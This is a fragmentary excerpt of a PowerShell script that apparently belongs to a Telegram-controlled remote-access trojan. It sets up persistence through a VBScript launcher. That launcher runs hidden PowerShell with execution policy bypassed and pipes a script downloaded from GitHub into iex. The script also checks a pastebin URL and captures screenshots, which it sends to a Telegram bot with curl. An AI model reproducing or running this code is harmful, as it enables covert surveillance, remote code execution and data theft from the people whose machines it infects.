...
$parent = "https://raw.githubusercontent.com/SNAKE112000/satanx112000/refs/heads/main/salt.ps1" # parent script URL (for restarts and persistance)
...
$versionCheck = irm -Uri "https://pastebin.com/raw/kxGWSSkp"
...
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/SNAKE112000/satanx112000/refs/heads/main/salt.ps1 | iex`", 0, True
"@
...
Function Take-Picture {
    ...
    $screenshotPath = Join-Path -Path $tempDir -ChildPath "screenshot.png"
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)

    Start-Sleep -Seconds 1
    curl.exe -F chat_id="$ChatID" -F document=@"$screenshotPath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
    Start-Sleep -Seconds 1
